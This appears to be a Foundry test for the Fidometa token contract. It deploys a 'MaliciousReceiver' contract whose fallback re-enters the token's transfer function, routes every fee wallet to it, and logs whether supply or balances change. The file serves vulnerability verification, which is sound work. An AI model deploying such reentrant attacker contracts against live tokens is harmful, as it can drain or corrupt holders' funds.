// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/FidoMeta.sol";

contract AtomicityViolationTest is Test {
    Fidometa token;
    MaliciousReceiver receiver;
    address deployer = address(this);
    address recipient = address(0x1);

    function setUp() public {
        // Deploy token contract
        token = new Fidometa();
        
        // Deploy malicious receiver contract
        receiver = new MaliciousReceiver(token);
    }

    function testReentrancyAttack() public {
        // Exclude malicious contract from all fees
        token.excludeFromCommunityCharge(address(receiver));
        token.excludedFromEcoSysFee(address(receiver));
        token.excludedFromSurcharge1(address(receiver));
        token.excludedFromSurcharge2(address(receiver));
        token.excludedFromSurcharge3(address(receiver));

        // Set malicious contract as fee wallets
        token.setEcoSysWallet(address(receiver));
        token.setSurcharge_1_Wallet(address(receiver));
        token.setSurcharge_2_Wallet(address(receiver));
        token.setSurcharge_3_Wallet(address(receiver));

        // Enable attack mode in receiver contract
        receiver.toggleAttackMode();

        console.log("--- BEFORE-Trigger Transfer ---");
        uint256 deployerBalanceBefore = token.balanceOf(deployer);
        uint256 receiverBalanceBefore = token.balanceOf(address(receiver));
        uint256 totalSupplyBefore = token.totalSupply();
        uint256 sumBefore = deployerBalanceBefore + receiverBalanceBefore;
        console.log("Deployer balance (before):", deployerBalanceBefore);
        console.log("Receiver balance (before):", receiverBalanceBefore);
        console.log("Total supply (before):", totalSupplyBefore);
        console.log("Sum of balances (before):", sumBefore);

        // Trigger vulnerable transfer - use 10% of the deployer's balance
        uint256 amount = token.balanceOf(deployer) / 10;
        
        console.log("--- Trigger Transfer ---");
        token.transfer(address(receiver), amount);

        console.log("--- AFTER-Trigger Transfer ---");
        uint256 deployerBalanceAfter = token.balanceOf(deployer);
        uint256 receiverBalanceAfter = token.balanceOf(address(receiver));
        uint256 totalSupplyAfter = token.totalSupply();
        uint256 sumAfter = deployerBalanceAfter + receiverBalanceAfter;
        console.log("Deployer balance (after):", deployerBalanceAfter);
        console.log("Receiver balance (after):", receiverBalanceAfter);
        console.log("Total supply (after):", totalSupplyAfter);
        console.log("Sum of balances (after):", sumAfter);
        
        // Verification comparison
        console.log("--- Verification ---");
        bool stateChanged = false;
        if (totalSupplyBefore != totalSupplyAfter) {
            console.log("[CRITICAL] Total supply altered:", totalSupplyBefore, "->", totalSupplyAfter);
            stateChanged = true;
        } else {
            console.log("[OK] Total supply unchanged");
        }
        
        if (sumBefore != sumAfter) {
            console.log("[CRITICAL] Balances sum altered:", sumBefore, "->", sumAfter);
            stateChanged = true;
        } else {
            console.log("[OK] Balances sum unchanged");
        }
        
        // Final verdict
        if (stateChanged) {
            console.log("Vulnerability Exists: state corruption detected");
        } else {
            console.log("Vulnerability not Exist: state consistency maintained");
        }
    }
}

contract MaliciousReceiver {
    Fidometa token;
    bool private inAttack;

    constructor(Fidometa _token) {
        token = _token;
    }

    function toggleAttackMode() external {
        inAttack = true;
    }

    // Reentrancy attack when receiving tokens
    function tokensReceived() private {
        if (inAttack) {
            // Execute reentrant call back to token contract
            uint256 amount = token.balanceOf(address(this)) / 2;
            token.transfer(msg.sender, amount);
        }
    }

    fallback() external {
        tokensReceived();
    }
}